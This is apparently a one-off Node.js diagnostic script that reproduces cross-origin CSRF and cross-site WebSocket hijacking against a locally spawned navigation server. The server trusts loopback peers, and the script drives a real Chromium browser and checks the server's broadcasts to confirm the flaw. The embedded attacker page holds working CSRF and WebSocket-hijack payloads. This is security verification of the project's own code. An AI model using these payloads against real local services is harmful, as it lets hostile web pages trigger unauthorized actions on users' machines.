// 一次性诊断：真实 Chromium 驱动的 browser → loopback 攻击复现（P4R Batch 3.5 §2/§3）。
//
// 存在的理由：`security::authorize()` 对 `PeerClass::Loopback` 无条件放行，因此
// 「TCP 对端是 127.0.0.1」被当成了「请求意图可信」。本脚本用**真实浏览器**证明
// 这两件事不等价：恶意页面（不同端口 = 不同 origin）可以让用户的浏览器向
// nav-server 发出来源地址为回环的请求，服务端看到的 peer 同样是 Loopback。
//
// 不使用 Python/Node 的 HTTP 客户端模拟浏览器——那些客户端本来就不受同源策略与
// CORS 约束，用它们复现等于什么都没证明。副作用判定打在服务端真实广播上：
// 攻击前后分别观察 `map_state` 的 destination。

import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { existsSync } from "node:fs";
import { mkdir, rm } from "node:fs/promises";
import { createServer as createNetServer } from "node:net";
import { networkInterfaces, tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "@playwright/test";

const WEB_DIR = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const REPO_ROOT = resolve(WEB_DIR, "..", "..");
const NAV_CLI = join(REPO_ROOT, "nav-core", "target", "debug", "nav-core-cli.exe");
const DATASET = join(REPO_ROOT, "data", "europe-v5");
const WORK = join(tmpdir(), "ets2nav-repro-loopback");

const A = [-58456, 32832]; // 目的地 A（合法路径设定）
const B = [-52925, 36510]; // 目的地 B（攻击目标）

function freePort() {
  return new Promise((ok, bad) => {
    const s = createNetServer();
    s.on("error", bad);
    s.listen(0, "127.0.0.1", () => {
      const { port } = s.address();
      s.close(() => ok(port));
    });
  });
}

function run(cmd, args, opts = {}) {
  return new Promise((ok, bad) => {
    const p = spawn(cmd, args, { stdio: ["ignore", "pipe", "pipe"], ...opts });
    let out = "", err = "";
    p.stdout.on("data", (d) => { out += d; });
    p.stderr.on("data", (d) => { err += d; });
    p.on("error", bad);
    p.on("close", (code) => ok({ code, out, err }));
  });
}

/** 本机 RFC1918 地址（用于「更接近真实远程来源」的攻击页面 origin）。 */
function rfc1918() {
  for (const list of Object.values(networkInterfaces())) {
    for (const ni of list ?? []) {
      if (ni.family !== "IPv4" || ni.internal) continue;
      const [a, b] = ni.address.split(".").map(Number);
      if (a === 10 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)) {
        return ni.address;
      }
    }
  }
  return null;
}

const ATTACK_PAGE = (navPort, label) => `<!doctype html>
<meta charset="utf-8"><title>attacker (${label})</title>
<body><h1>attacker page</h1>
<script>
window.__log = [];
// ① 跨源 simple POST：text/plain 属 CORS safelisted content type，
//    不触发 preflight，因此请求会真的发出去。
window.__csrf = async (navPort, to) => {
  try {
    const r = await fetch("http://127.0.0.1:" + navPort + "/api/route", {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify({ from: ${JSON.stringify(A)}, to }),
    });
    return { ok: true, type: r.type, status: r.status };
  } catch (e) {
    return { ok: false, error: String(e) };
  }
};
// ② 跨站 WebSocket：WS 完全不走 CORS，是否被接受只取决于服务端。
window.__cswh = (navPort, token) => new Promise((res) => {
  const out = { frames: 0, opened: false, error: null, origin: location.origin, usedToken: !!token };
  let sock;
  try {
    sock = new WebSocket("ws://127.0.0.1:" + navPort + "/ws" + (token ? "?token=" + token : ""));
  } catch (e) {
    out.error = String(e); res(out); return;
  }
  sock.onopen = () => { out.opened = true; };
  sock.onmessage = () => { out.frames++; };
  sock.onerror = () => { if (!out.error) out.error = "error event"; };
  sock.onclose = (ev) => {
    out.closeCode = ev.code;
    setTimeout(() => res(out), 1200);
  };
  setTimeout(() => { try { sock.close(); } catch {} ; }, 4000);
  setTimeout(() => res(out), 6000);
});
// ③ JSON 形态的跨源 POST（触发 preflight）
window.__csrfJson = async (navPort, to) => {
  try {
    const r = await fetch("http://127.0.0.1:" + navPort + "/api/route", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ from: ${JSON.stringify(A)}, to }),
    });
    return { ok: true, status: r.status };
  } catch (e) {
    return { ok: false, error: String(e) };
  }
};
</script>
</body>`;

/** 观察 `map_state` 广播：记录服务端实际广播过的目的地（真实副作用证据）。 */
function wsObserver(port, token) {
  const seen = [];
  let sock;
  const ready = new Promise((ok) => {
    sock = new WebSocket(`ws://127.0.0.1:${port}/ws?token=${token}`);
    sock.onopen = () => ok(true);
    sock.onerror = () => ok(false);
    sock.onmessage = (m) => {
      try {
        const v = JSON.parse(m.data);
        if (v.type === "map_state") seen.push(v.destination);
      } catch { /* 非 JSON 帧不影响观察 */ }
    };
    setTimeout(() => ok(sock.readyState === 1), 4000);
  });
  return { seen, ready, close: () => { try { sock.close(); } catch { /* 已关 */ } } };
}

const near = (p, q) => p && q && Math.abs(p[0] - q[0]) < 50 && Math.abs(p[1] - q[1]) < 50;

async function main() {
  await rm(WORK, { recursive: true, force: true });
  await mkdir(WORK, { recursive: true });

  const trace = join(WORK, "repro.navtrace");
  const gen = await run(NAV_CLI, ["syntrace", `${A[0]},${A[1]}:${B[0]},${B[1]}`, DATASET, trace],
    { cwd: join(REPO_ROOT, "nav-core") });
  if (gen.code !== 0 || !existsSync(trace)) {
    console.error(`syntrace 失败 (exit ${gen.code}):\n${gen.err}`);
    process.exit(2);
  }

  const navPort = await freePort();
  // 刻意**不加** `--lan`：这是项目默认运行方式，也就是「只绑回环、无令牌」的模式。
  const srv = spawn(NAV_CLI, [
    "server", DATASET, `--port=${navPort}`, `--web=${join(WEB_DIR, "dist")}`, `--replay=${trace}`,
  ], { cwd: join(REPO_ROOT, "nav-core"), stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
  let srvErr = "";
  srv.stderr.on("data", (d) => { srvErr += d; });

  let token = null;
  for (let i = 0; i < 300; i++) {
    try {
      const r = await fetch(`http://127.0.0.1:${navPort}/api/bootstrap`,
        { signal: AbortSignal.timeout(2000) });
      if (r.ok) {
        token = (await r.json()).token;
        break;
      }
    } catch { /* 尚未监听 */ }
    await new Promise((r) => setTimeout(r, 200));
  }
  console.log(`[repro] nav-server :${navPort}（loopback 模式，未加 --lan）；令牌 ${token ? "已引导" : "未取得"}`);

  const attackerPort = await freePort();
  const attacker = createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(ATTACK_PAGE(navPort, "attacker"));
  });
  await new Promise((ok) => attacker.listen(attackerPort, "0.0.0.0", ok));
  console.log(`[repro] 攻击页面 :${attackerPort}（与 nav-server 不同端口 = 跨源）`);

  const lan = rfc1918();
  const browser = await chromium.launch({
    args: ["--no-sandbox", "--disable-dev-shm-usage", "--no-proxy-server"],
  });

  const obs = wsObserver(navPort, token);
  const obsUp = await obs.ready;
  console.log(`[repro] 回环 WS 观察通道（带令牌）: ${obsUp ? "已建立" : "失败"}`);

  const results = {};

  // ── 前置：经合法本地路径设定目的地 A，作为 before 基线 ──────────────────
  const setA = await fetch(`http://127.0.0.1:${navPort}/api/route`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ from: A, to: A }),
  });
  results.legitSetA = setA.status;
  await new Promise((r) => setTimeout(r, 3000));
  results.destAfterA = obs.seen.at(-1) ?? null;
  console.log(`[repro] 合法路径设定 A: HTTP ${setA.status}，广播 destination=${JSON.stringify(results.destAfterA)}`);

  // ── 攻击 1：跨源 simple POST（text/plain，无 preflight） ────────────────
  for (const [label, origin] of [
    ["loopback-origin", `http://127.0.0.1:${attackerPort}/`],
    ...(lan ? [["lan-origin", `http://${lan}:${attackerPort}/`]] : []),
  ]) {
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    const pageErrors = [];
    page.on("console", (m) => { if (m.type() === "error") pageErrors.push(m.text()); });
    await page.goto(origin, { waitUntil: "domcontentloaded" });
    const before = obs.seen.length;
    const csrf = await page.evaluate(([p, to]) => window.__csrf(p, to), [navPort, B]);
    await new Promise((r) => setTimeout(r, 4000));
    const csrfJson = await page.evaluate(([p, to]) => window.__csrfJson(p, to), [navPort, B]);
    await new Promise((r) => setTimeout(r, 4000));
    const cswh = await page.evaluate(([p, tk]) => window.__cswh(p, tk), [navPort, null]);
    const newDests = obs.seen.slice(before);
    const cswhTok = await page.evaluate(([p, tk]) => window.__cswh(p, tk), [navPort, token]);
    results[label] = { csrf, csrfJson, cswh, cswhTok, newDests, pageErrors: pageErrors.slice(0, 5) };
    console.log(`\n[repro] === 攻击页面 origin = ${origin} ===`);
    console.log(`  simple POST (text/plain, no-cors): ${JSON.stringify(csrf)}`);
    console.log(`  JSON POST (application/json):      ${JSON.stringify(csrfJson)}`);
    console.log(`  cross-site WebSocket:              ${JSON.stringify(cswh)}`);
    console.log(`  cross-site WS + valid token:       ${JSON.stringify(cswhTok)}`);
    console.log(`  攻击后新广播的 destination:        ${JSON.stringify(newDests)}`);
    if (pageErrors.length) console.log(`  控制台错误: ${JSON.stringify(pageErrors.slice(0, 5))}`);
    await ctx.close();
  }

  const allDests = obs.seen;
  results.csrfConfirmed = allDests.some((d) => near(d, B));
  results.cswhConfirmed = Object.values(results)
    .some((v) => v && v.cswh && v.cswh.frames > 0);
  results.cswhWithTokenConfirmed = Object.values(results)
    .some((v) => v && v.cswhTok && v.cswhTok.frames > 0);

  console.log("\n──────────────── 判定 ────────────────");
  console.log(`  所有广播过的 destination: ${JSON.stringify(allDests)}`);
  console.log(`  HTTP loopback CSRF      : ${results.csrfConfirmed ? "CONFIRMED CSRF" : "not reproduced"}`);
  console.log(`  WebSocket CSWH          : ${results.cswhConfirmed ? "CONFIRMED CSWH" : "not reproduced"}`);
  console.log(`  WS + 有效令牌但恶意 Origin: ${results.cswhWithTokenConfirmed ? "CONFIRMED（Origin 检查被令牌覆盖）" : "not reproduced"}`);

  obs.close();
  await browser.close();
  await new Promise((ok) => attacker.close(ok));
  srv.kill();
  console.log(`\n[repro] server stderr 摘要:\n${srvErr.split("\n").slice(0, 12).join("\n")}`);
  console.log(`\nREPRO_JSON ${JSON.stringify(results)}`);
}

main().catch((e) => { console.error(e); process.exit(1); });
